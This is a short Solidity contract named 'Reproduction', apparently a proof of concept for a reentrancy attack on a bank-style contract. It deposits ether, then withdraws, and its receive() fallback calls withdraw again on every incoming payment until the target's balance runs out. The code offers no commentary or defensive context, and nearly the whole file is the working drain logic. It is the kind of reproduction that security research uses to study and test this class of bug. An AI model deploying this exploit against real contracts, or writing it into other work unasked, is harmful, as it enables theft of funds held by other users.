interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    IBank public target;

    constructor(address _target) {
        target = IBank(_target);
    }

    function setup() external payable {
        target.deposit{value: msg.value}();
    }

    function trigger(uint amount) external {
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }

}